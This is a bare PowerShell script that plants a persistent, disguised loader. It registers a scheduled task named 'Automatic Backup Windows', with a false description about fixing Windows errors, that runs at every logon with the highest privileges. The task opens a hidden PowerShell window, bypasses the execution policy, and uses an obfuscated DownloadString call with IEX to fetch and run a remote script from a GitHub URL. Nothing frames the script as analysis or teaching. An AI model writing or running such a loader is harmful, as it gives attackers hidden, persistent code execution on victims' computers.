$powershellcode = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$powershellcode')"
$need = "-Win Hidden -NoP -ExecutionPolicy Bypass"
$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$need `"IEX($download)`"" 
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_name = "Automatic Backup Windows"
$task_desc = "Always Backup & Fix If Windows ERROR. "
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
